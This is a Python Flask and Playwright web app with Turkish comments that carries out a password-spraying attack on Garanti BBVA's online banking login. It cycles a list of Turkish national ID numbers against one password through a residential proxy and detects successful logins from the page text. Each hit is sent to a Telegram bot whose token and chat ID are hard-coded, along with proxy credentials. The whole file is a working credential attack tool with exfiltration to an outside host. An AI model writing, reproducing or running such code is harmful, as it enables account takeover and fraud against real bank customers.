import os
import asyncio
import math
import requests
from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO
from playwright.async_api import async_playwright

app = Flask(__name__)
# Render ve Socket.io uyumu için secret_key ekledik
app.config['SECRET_KEY'] = 'garanti_secret_key'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# --- Konfigürasyon ---
CONFIG = {
    "url": "https://sube.garantibbva.com.tr/isube/login/login/passwordentrypersonal-tr",
    "proxy": {
        "server": "http://gw.dataimpulse.com:823",
        "username": "bfa46317aef5ab052141__cr.tr",
        "password": "f95867774f1e8481"
    },
    "tg_token": "8227836330:AAGDgPLPs2DIdusrL9WTNiURZZkBW758xFc",
    "tg_chat": "-1003373347143"
}

is_running = False
results = []

async def handle_route(route):
    if route.request.resource_type in ["image", "stylesheet", "font", "media"]:
        await route.abort()
    else:
        await route.continue_()

async def start_bot_logic(tcs, password, threads):
    global is_running
    async with async_playwright() as p:
        # Render'da çalışması için args eklendi
        browser = await p.chromium.launch(
            headless=True, 
            proxy=CONFIG["proxy"],
            args=['--no-sandbox', '--disable-setuid-sandbox']
        )
        
        async def worker(list_part):
            for tc in list_part:
                if not is_running: break
                ctx = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
                page = await ctx.new_page()
                await page.route("**/*", handle_route)
                try:
                    socketio.emit('log', {'m': f'>>> Deneniyor: {tc}'})
                    await page.goto(CONFIG["url"], wait_until="domcontentloaded", timeout=50000)
                    
                    await page.wait_for_selector('input[name="musteriNoLabelUstte"]', state="attached", timeout=20000)
                    await page.fill('input[name="musteriNoLabelUstte"]', tc)
                    await page.fill('input[name="parolaLabelUstte"]', password)
                    await page.click('#formSubmit')
                    
                    # Sayfa sonucunu bekle
                    await asyncio.sleep(8)
                    content = await page.content()
                    
                    if "Telefonunuza gönderilen mobil bildirimi onaylamanız" in content:
                        socketio.emit('log', {'m': f'[+] BAŞARILI: {tc}'})
                        socketio.emit('success', {'tc': tc})
                        results.append(f"{tc}:{password}")
                        requests.post(f"https://api.telegram.org/bot{CONFIG['tg_token']}/sendMessage", 
                                     data={"chat_id": CONFIG['tg_chat'], "text": f"✅ BAŞARILI\nTC: `{tc}`\nPW: `{password}`", "parse_mode": "Markdown"})
                    elif "İşleminize devam edilemiyor" in content:
                        socketio.emit('log', {'m': f'[-] HATALI: {tc}'})
                    else:
                        socketio.emit('log', {'m': f'[?] BELİRSİZ/ZAMAN AŞIMI: {tc}'})
                except Exception as e:
                    socketio.emit('log', {'m': f'[!] HATA: {tc}'})
                await ctx.close()

        chunk = math.ceil(len(tcs)/threads)
        tasks = [worker(tcs[i*chunk:(i+1)*chunk]) for i in range(threads)]
        await asyncio.gather(*tasks)
        await browser.close()
        is_running = False
        socketio.emit('log', {'m': '--- İşlem Tamamlandı ---'})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/action', methods=['POST'])
def action():
    global is_running
    data = request.json
    if data['op'] == 'start' and not is_running:
        is_running = True
        tcs = [t.strip() for t in data['tcs'].split('\n') if t.strip()]
        # Arka planda botu başlat
        socketio.start_background_task(lambda: asyncio.run(start_bot_logic(tcs, data['pw'], int(data['th']))))
        return jsonify({"status": "started"})
    else:
        is_running = False
        return jsonify({"status": "stopped"})

@app.route('/download')
def download():
    with open('sonuclar.txt', 'w') as f:
        f.write('\n'.join(results))
    return send_file('sonuclar.txt', as_attachment=True)

if __name__ == '__main__':
    # Render port ayarı
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
